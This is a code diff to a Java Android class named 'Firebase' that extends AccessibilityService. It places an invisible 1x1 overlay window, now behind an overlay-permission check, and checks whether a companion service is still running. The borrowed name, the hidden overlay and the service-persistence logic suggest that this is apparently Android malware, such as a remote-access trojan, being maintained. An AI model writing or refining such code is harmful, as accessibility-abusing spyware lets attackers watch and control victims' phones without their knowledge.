@@ -26,6 +26,7 @@ import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityManager;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.provider.Settings;
 import android.widget.FrameLayout;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
@@ -520,17 +521,19 @@ public class Firebase extends AccessibilityService {
         } catch (Exception unused) {}
         try {
             love.MyAccess = this;
-            WindowManager wm = (WindowManager) getSystemService("window");
-            FrameLayout layout = new FrameLayout(this);
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    1, 1, 2032, -2142501864, -3);
-            params.gravity = 48;
-            Firebaselay = params;
-            Firebasewm = wm;
-            wm.addView(layout, params);
+            if (Build.VERSION.SDK_INT < 23 || android.provider.Settings.canDrawOverlays(this)) {
+                WindowManager wm = (WindowManager) getSystemService("window");
+                FrameLayout layout = new FrameLayout(this);
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                        1, 1, 2032, -2142501864, -3);
+                params.gravity = 48;
+                Firebaselay = params;
+                Firebasewm = wm;
+                wm.addView(layout, params);
+            }
         } catch (Exception unused) {}
         try {
-            // body.java pending — launch deferred
+            
         } catch (Exception unused) {}
         try {
             if (LoveApi0.isServiceNotRunning(love.class, getApplication())) {
